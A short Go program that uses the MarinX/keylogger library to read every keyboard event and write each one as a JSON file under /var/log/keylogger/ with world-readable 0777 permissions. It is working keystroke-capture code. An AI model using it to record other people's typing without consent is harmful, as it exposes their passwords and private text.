package main

import (
	"encoding/json"
	"os"
	"strconv"
	"time"

	"github.com/MarinX/keylogger"
)

func main() {
	logdir := "/var/log/keylogger/"
	keyboard := keylogger.FindKeyboardDevice()
	k, err := keylogger.New(keyboard)
	if err != nil {
		panic(err)
	}
	events := k.Read()
	for e := range events {
		b, _ := json.Marshal(e)
		b = append(b, '\n')
		timestamp := time.Now().UnixNano()
		filename := logdir + strconv.FormatInt(timestamp, 10) + ".json"
		err := os.WriteFile(filename, b, os.ModePerm)
		if err != nil {
			panic(err)
		}
	}
}
